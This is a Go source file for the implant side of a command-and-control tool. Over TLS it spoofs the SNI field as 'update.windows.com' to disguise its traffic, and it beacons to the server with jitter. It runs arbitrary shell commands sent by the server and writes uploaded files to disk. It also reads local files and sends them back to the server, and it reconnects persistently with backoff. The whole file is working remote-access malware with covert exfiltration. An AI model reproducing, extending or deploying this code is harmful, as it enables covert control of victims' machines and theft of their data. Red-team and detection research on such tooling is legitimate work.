// Command client is the implant side of the SNI-spoofing C2.
//
// It connects to the C2 server using TLS with a spoofed SNI field
// (e.g. "update.windows.com"), beacons periodically, receives commands,
// executes them, and sends back results.
package main

import (
	"crypto/tls"
	"encoding/base64"
	"encoding/json"
	"flag"
	"fmt"
	"math/rand"
	"net"
	"os"
	"os/exec"
	"os/signal"
	"runtime"
	"sync/atomic"
	"syscall"
	"time"

	tlsutil "github.com/openclaw/c2-sni-spoof/pkg/tls"
)

// ---------- Message types (match server) ----------

type Beacon struct {
	Type     string `json:"type"`
	Hostname string `json:"hostname"`
	PID      int    `json:"pid"`
	BeaconID int64  `json:"beacon_id"`
	SNI      string `json:"sni,omitempty"`
}

type Command struct {
	Type      string `json:"type"`
	Payload   string `json:"payload,omitempty"`
	Filename  string `json:"filename,omitempty"`
	Data      string `json:"data,omitempty"`
	BeaconSec int    `json:"beacon_sec,omitempty"`
	ID        int64  `json:"id,omitempty"`
}

type Result struct {
	Type    string `json:"type"`
	Command int64  `json:"command_id"`
	Output  string `json:"output,omitempty"`
	Data    string `json:"data,omitempty"`
	Error   string `json:"error,omitempty"`
}

// ---------- Implant state ----------

type Implant struct {
	serverAddr string
	sniDomain  string
	caFile     string
	hostname   string
	pid        int
	beaconSec  int64 // atomic for safe concurrent access
	beaconID   int64
	conn       net.Conn
	enc        *json.Encoder
	dec        *json.Decoder
}

func NewImplant(serverAddr, sniDomain, caFile string, beaconSec int) *Implant {
	hostname, _ := os.Hostname()
	if hostname == "" {
		hostname = "unknown"
	}
	return &Implant{
		serverAddr: serverAddr,
		sniDomain:  sniDomain,
		caFile:     caFile,
		hostname:   hostname,
		pid:        os.Getpid(),
		beaconSec:  int64(beaconSec),
	}
}

// ---------- Connection management ----------

func (imp *Implant) connect() error {
	tlsCfg, err := tlsutil.ClientTLSConfig(imp.sniDomain, imp.caFile)
	if err != nil {
		return fmt.Errorf("TLS config: %w", err)
	}

	conn, err := tls.Dial("tcp", imp.serverAddr, tlsCfg)
	if err != nil {
		return fmt.Errorf("TLS dial: %w", err)
	}

	imp.conn = conn
	imp.enc = json.NewEncoder(conn)
	imp.dec = json.NewDecoder(conn)

	return nil
}

func (imp *Implant) close() {
	if imp.conn != nil {
		imp.conn.Close()
		imp.conn = nil
	}
}

// ---------- Main beacon loop ----------

func (imp *Implant) run() error {
	if err := imp.connect(); err != nil {
		return err
	}
	defer imp.close()

	fmt.Fprintf(os.Stderr, "[*] implant connected to %s (SNI: %s)\n",
		imp.serverAddr, imp.sniDomain)

	for {
		// Build beacon.
		bid := atomic.AddInt64(&imp.beaconID, 1)
		beacon := Beacon{
			Type:     "beacon",
			Hostname: imp.hostname,
			PID:      imp.pid,
			BeaconID: bid,
			SNI:      imp.sniDomain,
		}

		// Send beacon.
		if err := imp.enc.Encode(beacon); err != nil {
			return fmt.Errorf("send beacon: %w", err)
		}

		// Receive command.
		var cmd Command
		if err := imp.dec.Decode(&cmd); err != nil {
			return fmt.Errorf("recv command: %w", err)
		}

		// Process command (noop and ping don't produce a result).
		switch cmd.Type {
		case "noop":
			// nothing to do
		case "ping":
			// nothing to do, just continue
		case "exec":
			res := imp.handleExec(cmd)
			if err := imp.enc.Encode(res); err != nil {
				return fmt.Errorf("send result: %w", err)
			}
		case "upload":
			res := imp.handleUpload(cmd)
			if err := imp.enc.Encode(res); err != nil {
				return fmt.Errorf("send result: %w", err)
			}
		case "download":
			res := imp.handleDownload(cmd)
			if err := imp.enc.Encode(res); err != nil {
				return fmt.Errorf("send result: %w", err)
			}
		case "beacon":
			if cmd.BeaconSec > 0 {
				atomic.StoreInt64(&imp.beaconSec, int64(cmd.BeaconSec))
				res := Result{
					Type:    "result",
					Command: cmd.ID,
					Output:  fmt.Sprintf("beacon interval changed to %ds", cmd.BeaconSec),
				}
				if err := imp.enc.Encode(res); err != nil {
					return fmt.Errorf("send result: %w", err)
				}
			}
		default:
			res := Result{
				Type:    "error",
				Command: cmd.ID,
				Error:   fmt.Sprintf("unknown command type: %s", cmd.Type),
			}
			imp.enc.Encode(res)
		}

		// Sleep for beacon interval, with ±20% jitter.
		sec := atomic.LoadInt64(&imp.beaconSec)
		baseSleep := time.Duration(sec) * time.Second
		jitterMax := baseSleep / 5
		jitter := time.Duration(rand.Int63n(int64(jitterMax)))
		if rand.Int63n(2) == 0 {
			time.Sleep(baseSleep + jitter)
		} else {
			time.Sleep(baseSleep - jitter)
		}
	}
}

// ---------- Command handlers ----------

func (imp *Implant) handleExec(cmd Command) Result {
	// Determine shell based on OS.
	shell, shellFlag := "/bin/sh", "-c"
	if runtime.GOOS == "windows" {
		shell, shellFlag = "cmd.exe", "/C"
	}

	execCmd := exec.Command(shell, shellFlag, cmd.Payload)
	output, err := execCmd.CombinedOutput()
	if err != nil {
		return Result{
			Type:    "result",
			Command: cmd.ID,
			Output:  string(output),
			Error:   err.Error(),
		}
	}
	return Result{
		Type:    "result",
		Command: cmd.ID,
		Output:  string(output),
	}
}

func (imp *Implant) handleUpload(cmd Command) Result {
	if cmd.Filename == "" || cmd.Data == "" {
		return Result{
			Type:    "error",
			Command: cmd.ID,
			Error:   "missing filename or data",
		}
	}

	data, err := base64.StdEncoding.DecodeString(cmd.Data)
	if err != nil {
		return Result{
			Type:    "error",
			Command: cmd.ID,
			Error:   fmt.Sprintf("base64 decode: %v", err),
		}
	}

	if err := os.WriteFile(cmd.Filename, data, 0644); err != nil {
		return Result{
			Type:    "error",
			Command: cmd.ID,
			Error:   fmt.Sprintf("write file: %v", err),
		}
	}

	return Result{
		Type:    "result",
		Command: cmd.ID,
		Output:  fmt.Sprintf("uploaded %d bytes to %s", len(data), cmd.Filename),
	}
}

func (imp *Implant) handleDownload(cmd Command) Result {
	if cmd.Filename == "" {
		return Result{
			Type:    "error",
			Command: cmd.ID,
			Error:   "missing filename",
		}
	}

	data, err := os.ReadFile(cmd.Filename)
	if err != nil {
		return Result{
			Type:    "error",
			Command: cmd.ID,
			Error:   fmt.Sprintf("read file: %v", err),
		}
	}

	return Result{
		Type:    "result",
		Command: cmd.ID,
		Output:  fmt.Sprintf("downloaded %d bytes from %s", len(data), cmd.Filename),
		Data:    base64.StdEncoding.EncodeToString(data),
	}
}

// ---------- Reconnect loop with exponential backoff ----------

func (imp *Implant) runWithReconnect() {
	maxBackoff := 5 * time.Minute
	backoff := 1 * time.Second

	for {
		err := imp.run()
		if err != nil {
			fmt.Fprintf(os.Stderr, "[!] connection lost: %v\n", err)
			fmt.Fprintf(os.Stderr, "[*] reconnecting in %v\n", backoff)
		}

		// Wait with backoff, respect interrupt.
		sleepTimer := time.NewTimer(backoff)

		sigCh := make(chan os.Signal, 1)
		signal.Notify(sigCh, syscall.SIGINT, syscall.SIGTERM)

		select {
		case <-sigCh:
			sleepTimer.Stop()
			signal.Stop(sigCh)
			fmt.Println("\n[*] implant shutting down…")
			return
		case <-sleepTimer.C:
		}
		signal.Stop(sigCh)

		// Exponential backoff with cap.
		backoff *= 2
		if backoff > maxBackoff {
			backoff = maxBackoff
		}

		// Add jitter (±25%).
		jitter := time.Duration(rand.Int63n(int64(backoff) / 4))
		if rand.Int63n(2) == 0 {
			backoff += jitter
		} else {
			backoff -= jitter
			if backoff < time.Second {
				backoff = time.Second
			}
		}
	}
}

// ---------- main ----------

func main() {
	serverAddr := flag.String("c2", "", "C2 server address (host:port)")
	sniDomain := flag.String("sni", "update.windows.com", "SNI domain to spoof")
	caFile := flag.String("ca", "ca.crt", "CA certificate file for TLS verification")
	beaconSec := flag.Int("beacon", 10, "beacon interval in seconds")
	flag.Parse()

	if *serverAddr == "" {
		fmt.Fprintln(os.Stderr, "error: -c2 flag is required (e.g. -c2 192.168.1.100:8443)")
		flag.Usage()
		os.Exit(1)
	}

	fmt.Fprintf(os.Stderr, "[*] SNI Spoof Implant starting\n")
	fmt.Fprintf(os.Stderr, "[*] C2: %s  SNI: %s  Beacon: %ds\n",
		*serverAddr, *sniDomain, *beaconSec)
	h, _ := os.Hostname()
	fmt.Fprintf(os.Stderr, "[*] Hostname: %s  PID: %d  OS: %s\n", h, os.Getpid(), runtime.GOOS)

	imp := NewImplant(*serverAddr, *sniDomain, *caFile, *beaconSec)

	// Handle interrupt for graceful shutdown.
	sigCh := make(chan os.Signal, 1)
	signal.Notify(sigCh, syscall.SIGINT, syscall.SIGTERM)
	go func() {
		<-sigCh
		fmt.Fprintln(os.Stderr, "\n[*] shutting down…")
		imp.close()
		os.Exit(0)
	}()

	imp.runWithReconnect()
}
